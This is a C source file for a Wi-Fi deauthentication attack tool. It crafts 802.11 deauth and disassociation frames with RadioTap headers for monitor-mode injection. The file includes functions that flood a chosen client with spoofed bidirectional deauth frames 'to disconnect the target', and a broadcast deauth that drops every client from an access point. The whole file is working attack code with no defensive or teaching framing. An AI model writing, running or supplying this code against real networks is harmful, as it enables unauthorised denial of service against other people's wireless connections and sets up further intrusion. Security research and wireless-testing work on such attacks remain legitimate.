/**
 * deauth_craft.c - Batch deauthentication/disassociation frame builder
 *
 * Constructs and sends 802.11 deauthentication and disassociation
 * management frames with minimal RadioTap headers for raw injection
 * via monitor mode interfaces.
 *
 * Linux-only. No external dependencies beyond libc.
 *
 * Compile: gcc -std=c11 -c deauth_craft.c -o deauth_craft.o
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include "deauth_craft.h"
#include "packet_engine.h"

/* ==================== 802.11 Frame Constants ==================== */

/*
 * Minimal RadioTap header (8 bytes):
 *   version:  0
 *   pad:      0
 *   len:      8 (little-endian)
 *   present:  0x00000000 (no fields present)
 */
#define RADIOTAP_HDR_SIZE 8

static const uint8_t RADIOTAP_HDR[RADIOTAP_HDR_SIZE] = {
    0x00,                   /* it_version */
    0x00,                   /* it_pad */
    0x08, 0x00,             /* it_len (8, little-endian) */
    0x00, 0x00, 0x00, 0x00  /* it_present (no fields) */
};

/*
 * 802.11 Frame Control field values:
 *   Deauthentication: type=0 (management), subtype=12 (0x0C)
 *     FC = 0x00C0 (little-endian: 0xC0, 0x00)
 *   Disassociation: type=0 (management), subtype=10 (0x0A)
 *     FC = 0x00A0 (little-endian: 0xA0, 0x00)
 */
#define FC_DEAUTH_BYTE0    0xC0
#define FC_DEAUTH_BYTE1    0x00
#define FC_DISASSOC_BYTE0  0xA0
#define FC_DISASSOC_BYTE1  0x00

/* Duration field (typically 0 for deauth/disassoc) */
#define DURATION_BYTE0     0x00
#define DURATION_BYTE1     0x00

/* Broadcast MAC address */
static const uint8_t BROADCAST_MAC[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

/* Total frame size: RadioTap(8) + FC(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtrl(2) + Reason(2) = 34 */
#define DEAUTH_FRAME_SIZE  34

/* ==================== Internal Helpers ==================== */

/**
 * Build a management frame (deauth or disassoc) with RadioTap header.
 *
 * Frame structure:
 *   [8]  RadioTap header
 *   [2]  Frame Control
 *   [2]  Duration/ID
 *   [6]  Address 1 (receiver/destination)
 *   [6]  Address 2 (sender/source)
 *   [6]  Address 3 (BSSID)
 *   [2]  Sequence Control (set to 0, driver will fill)
 *   [2]  Reason Code (little-endian)
 *
 * @param buf        Output buffer (must be >= 34 bytes)
 * @param fc_byte0   Frame control byte 0
 * @param fc_byte1   Frame control byte 1
 * @param sender     Source MAC (6 bytes)
 * @param receiver   Destination MAC (6 bytes)
 * @param bssid      BSSID MAC (6 bytes)
 * @param reason     Reason code
 * @return           Frame length (always 34)
 */
static size_t build_mgmt_frame(uint8_t *buf, uint8_t fc_byte0, uint8_t fc_byte1,
                               const uint8_t *sender, const uint8_t *receiver,
                               const uint8_t *bssid, uint16_t reason)
{
    size_t offset = 0;

    /* RadioTap header */
    memcpy(buf + offset, RADIOTAP_HDR, RADIOTAP_HDR_SIZE);
    offset += RADIOTAP_HDR_SIZE;

    /* Frame Control */
    buf[offset++] = fc_byte0;
    buf[offset++] = fc_byte1;

    /* Duration/ID */
    buf[offset++] = DURATION_BYTE0;
    buf[offset++] = DURATION_BYTE1;

    /* Address 1: Receiver (Destination) */
    memcpy(buf + offset, receiver, 6);
    offset += 6;

    /* Address 2: Sender (Source) */
    memcpy(buf + offset, sender, 6);
    offset += 6;

    /* Address 3: BSSID */
    memcpy(buf + offset, bssid, 6);
    offset += 6;

    /* Sequence Control (0x0000 - driver/firmware handles) */
    buf[offset++] = 0x00;
    buf[offset++] = 0x00;

    /* Reason Code (little-endian) */
    buf[offset++] = (uint8_t)(reason & 0xFF);
    buf[offset++] = (uint8_t)((reason >> 8) & 0xFF);

    return offset; /* Should always be 34 */
}

/* ==================== Public API ==================== */

/**
 * Craft a deauthentication frame with RadioTap header.
 *
 * Builds a complete deauth frame ready for injection via raw socket.
 * The reason code is typically 7 (Class 3 frame from nonassociated STA).
 */
__attribute__((visibility("default")))
size_t craft_deauth_frame(uint8_t *buf, const uint8_t *sender,
                          const uint8_t *receiver, const uint8_t *bssid,
                          uint16_t reason)
{
    if (!buf || !sender || !receiver || !bssid) {
        errno = EINVAL;
        return 0;
    }

    return build_mgmt_frame(buf, FC_DEAUTH_BYTE0, FC_DEAUTH_BYTE1,
                            sender, receiver, bssid, reason);
}

/**
 * Craft a disassociation frame with RadioTap header.
 *
 * Builds a complete disassoc frame ready for injection via raw socket.
 * The reason code is typically 8 (STA is leaving / has left).
 */
__attribute__((visibility("default")))
size_t craft_disassoc_frame(uint8_t *buf, const uint8_t *sender,
                            const uint8_t *receiver, const uint8_t *bssid,
                            uint16_t reason)
{
    if (!buf || !sender || !receiver || !bssid) {
        errno = EINVAL;
        return 0;
    }

    return build_mgmt_frame(buf, FC_DISASSOC_BYTE0, FC_DISASSOC_BYTE1,
                            sender, receiver, bssid, reason);
}

/**
 * Send burst of deauth frames targeting a specific client.
 *
 * If bidirectional is set, sends deauths both from AP to client
 * and from client to AP (spoofed), which is more effective at
 * disconnecting the target.
 *
 * @return Number of frames successfully sent, -1 on fatal error.
 */
__attribute__((visibility("default")))
int deauth_target(int sock_fd, const uint8_t *bssid, const uint8_t *client,
                  int burst_count, int bidirectional)
{
    uint8_t frame[DEAUTH_FRAME_SIZE];
    int sent = 0;
    size_t frame_len;

    if (sock_fd < 0 || !bssid || !client || burst_count <= 0) {
        errno = EINVAL;
        return -1;
    }

    for (int i = 0; i < burst_count; i++) {
        /*
         * Direction 1: AP -> Client (deauth from AP)
         * sender=bssid, receiver=client, bssid=bssid
         * Reason 7: Class 3 frame received from nonassociated STA
         */
        frame_len = craft_deauth_frame(frame, bssid, client, bssid, 7);
        if (frame_len > 0) {
            if (send_frame(sock_fd, frame, frame_len) == 0) {
                sent++;
            }
        }

        if (bidirectional) {
            /*
             * Direction 2: Client -> AP (spoofed deauth from client)
             * sender=client, receiver=bssid, bssid=bssid
             * Reason 8: Disassociated because STA is leaving
             */
            frame_len = craft_deauth_frame(frame, client, bssid, bssid, 8);
            if (frame_len > 0) {
                if (send_frame(sock_fd, frame, frame_len) == 0) {
                    sent++;
                }
            }
        }
    }

    return sent;
}

/**
 * Send broadcast deauth frames (from AP to broadcast address).
 *
 * Sends deauthentication frames with the broadcast MAC as destination,
 * which causes all clients associated with the AP to deauthenticate.
 *
 * @return Number of frames successfully sent, -1 on fatal error.
 */
__attribute__((visibility("default")))
int deauth_broadcast(int sock_fd, const uint8_t *bssid, int burst_count)
{
    uint8_t frame[DEAUTH_FRAME_SIZE];
    int sent = 0;
    size_t frame_len;

    if (sock_fd < 0 || !bssid || burst_count <= 0) {
        errno = EINVAL;
        return -1;
    }

    for (int i = 0; i < burst_count; i++) {
        /*
         * Broadcast deauth: AP -> FF:FF:FF:FF:FF:FF
         * sender=bssid, receiver=broadcast, bssid=bssid
         * Reason 7: Class 3 frame received from nonassociated STA
         */
        frame_len = craft_deauth_frame(frame, bssid, BROADCAST_MAC, bssid, 7);
        if (frame_len > 0) {
            if (send_frame(sock_fd, frame, frame_len) == 0) {
                sent++;
            }
        }
    }

    return sent;
}
